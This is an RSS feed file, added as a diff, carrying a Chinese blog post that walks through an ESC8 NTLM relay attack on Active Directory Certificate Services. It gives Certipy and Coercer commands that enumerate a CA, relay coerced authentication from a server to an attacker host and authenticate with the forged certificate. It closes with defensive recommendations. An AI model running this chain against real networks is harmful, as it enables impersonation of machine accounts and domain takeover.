@@ -1,0 +1,115 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>证书伪造 on 办公AI智能小助手</title>
+        <link>http://localhost:1313/tags/%E8%AF%81%E4%B9%A6%E4%BC%AA%E9%80%A0/</link>
+        <description>Recent content in 证书伪造 on 办公AI智能小助手</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>qife</copyright>
+        <lastBuildDate>Tue, 05 Aug 2025 13:08:37 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E8%AF%81%E4%B9%A6%E4%BC%AA%E9%80%A0/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>滥用Active Directory证书服务(第三部分) - 中继攻击与证书伪造实战</title>
+        <link>http://localhost:1313/p/%E6%BB%A5%E7%94%A8active-directory%E8%AF%81%E4%B9%A6%E6%9C%8D%E5%8A%A1%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86-%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB%E4%B8%8E%E8%AF%81%E4%B9%A6%E4%BC%AA%E9%80%A0%E5%AE%9E%E6%88%98/</link>
+        <pubDate>Tue, 05 Aug 2025 13:08:37 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%BB%A5%E7%94%A8active-directory%E8%AF%81%E4%B9%A6%E6%9C%8D%E5%8A%A1%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86-%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB%E4%B8%8E%E8%AF%81%E4%B9%A6%E4%BC%AA%E9%80%A0%E5%AE%9E%E6%88%98/</guid>
+        <description>&lt;h1 id=&#34;滥用active-directory证书服务第三部分&#34;&gt;滥用Active Directory证书服务(第三部分)
+&lt;/h1&gt;&lt;p&gt;在&lt;a class=&#34;link&#34; href=&#34;https://example.com/part1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;第一部分&lt;/a&gt;和&lt;a class=&#34;link&#34; href=&#34;https://example.com/part2&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;第二部分&lt;/a&gt;中，我们探讨了Active Directory证书模板的常见错误配置。本文将重点分析Web Enrollment功能的攻击利用。&lt;/p&gt;
+&lt;h2 id=&#34;adcs-http端点中继攻击&#34;&gt;ADCS HTTP端点中继攻击
+&lt;/h2&gt;&lt;p&gt;Active Directory证书服务(ADCS)支持基于HTTP的证书注册方法。当启用时，这些HTTP接口可能遭受NTLM中继攻击。攻击者诱导受害者账户向受控主机认证后，可将凭据中继到证书颁发机构(CA)来代表受害者申请证书。&lt;/p&gt;
+&lt;p&gt;某些情况下甚至不需要域凭据。例如利用CVE-2021-36942漏洞，攻击者可通过LSARPC接口的OpenEncryptedFileRaw API方法诱导目标主机进行认证。&lt;/p&gt;
+&lt;h2 id=&#34;esc8攻击实例&#34;&gt;ESC8攻击实例
+&lt;/h2&gt;&lt;p&gt;假设我们已初步入侵FOOBAR公司内网，并获取用户&amp;quot;billy&amp;quot;的凭据。通过Certipy工具枚举&amp;quot;foobar.com&amp;quot;域的ADCS配置：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;certipy find &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;billy@foobar.com&amp;#39;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -p &amp;lt;PASSWORD&amp;gt; &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -dc-ip &amp;lt;DC_IP&amp;gt; &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -enabled
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;当CA服务器满足以下条件即存在ESC8漏洞：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Web Enrollment功能启用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;攻击步骤分解&#34;&gt;攻击步骤分解
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;设置中继服务&lt;/strong&gt;：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;certipy relay &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -ca foobar-CA.foobar.com &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -template &lt;span class=&#34;s1&#34;&gt;&amp;#39;DomainComputers&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;strong&gt;诱导目标机器认证&lt;/strong&gt;：
+使用Coercer工具触发server01.foobar.com向攻击主机(10.10.1.100)认证：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;coercer coerce &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -t server01.foobar.com &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -I 10.10.1.100 &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;billy@foobar.com&amp;#39;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -p &amp;lt;PASSWORD&amp;gt; &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -d foobar.com
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;&lt;strong&gt;伪造证书并获取凭据&lt;/strong&gt;：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;certipy auth -pfx server01.pfx
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;防御建议&#34;&gt;防御建议
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;禁用非必要的ADCS HTTP端点&lt;/li&gt;
+&lt;li&gt;尽可能禁用NTLM认证&lt;/li&gt;
+&lt;li&gt;强制启用HTTPS并配置身份验证扩展保护&lt;/li&gt;
+&lt;li&gt;启用SMB/LDAP签名要求&lt;/li&gt;
+&lt;li&gt;强制实施LDAP通道绑定&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;技术资源&#34;&gt;技术资源
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/ly4k/Certipy&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Certipy工具&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/fortra/impacket&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Impacket套件&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://support.microsoft.com/en-us/topic/kb5005413&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;微软安全指南KB5005413&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
